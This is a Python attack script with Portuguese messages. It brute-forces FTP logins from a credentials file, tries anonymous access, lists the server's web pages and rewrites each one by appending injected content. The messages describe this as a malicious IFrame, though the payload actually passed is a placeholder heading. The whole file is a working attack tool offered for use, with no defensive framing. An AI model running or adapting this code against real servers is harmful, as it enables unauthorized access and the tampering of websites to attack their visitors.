import ftplib, optparse

def bruteForce(host, pw_file):
    pw_file = open(pw_file, 'r')
    
    for line in pw_file.readlines():
        user = line.split(':')[0]
        pw = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Tentando: " + user + "/" + pw)
        try:
            ftp = ftplib.FTP(host, timeout=5)
            ftp.login(user, pw)
            print('\n[*] ' + host + \
                ' FTP Login Sucesso: ' + user + "/" + pw)
            ftp.quit()
            return (user, pw)
        except Exception:
            pass
    print('\n[-] Não foi possível descobrir as credenciais FTP.')
    exit(0)


def loginAnonimo(host_alvo):
    try:
        ftp = ftplib.FTP(host_alvo, timeout=5)
        ftp.login('anonymous', 'anonymous')
        print('[*] ' + host_alvo + ' FTP Login Anonimo Sucesso.')
        ftp.quit()
        return True
    except Exception:
        print('[-] ' + host_alvo + ' FTP Login Anonimo Falhou.')
    return False


def listPages(ftp):
    try:
        lista_diretorios = ftp.nlst()
    except:
        lista_diretorios = []
        print('[-] Não foi possível listar o conteúdo.')
        return []

    lista_arquivos: list[str] = []

    print("\n[+] Arquivos")
    for fileName in lista_diretorios:
        print(fileName)
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print('[+] Encontrado a página padrão: ' + fileName)
            lista_arquivos.append(fileName)
    return lista_arquivos


def injectPage(ftp, pagina, redirecionar):
    f = open(pagina + '.tmp', 'w')
    ftp.retrlines('RETR ' + pagina, f.write)
    print('[+] Página baixada: ' + pagina)

    f.write(redirecionar)
    f.close()
    print('[+] Injetado IFrame malicioso em: ' + pagina)

    ftp.storlines('STOR ' + pagina, open(pagina + '.tmp'))
    print('[+] Página injetada enviada: ' + pagina)


def start():
    opt = optparse.OptionParser('Use -H <host> -f <passwords_file>')
    opt.add_option('-H', dest='host', type='string', help='specify the host')
    opt.add_option('-f', dest='file', type='string', help='specify the users and passwords file')

    (options, _) = opt.parse_args()

    host = options.host
    file = options.file

    if (host == None) | (file == None):
        print(opt.usage)
        exit(0)
    
    (user, pw) = bruteForce(host, file)

    loginAnonimo(host)

    ftp = ftplib.FTP(host)
    ftp.login(user, pw)

    pages: list[str] = listPages(ftp)

    for page in pages:
        injectPage(ftp, page, "<h1>Will it work?</h1>" )


if __name__ == "__main__":
    start()
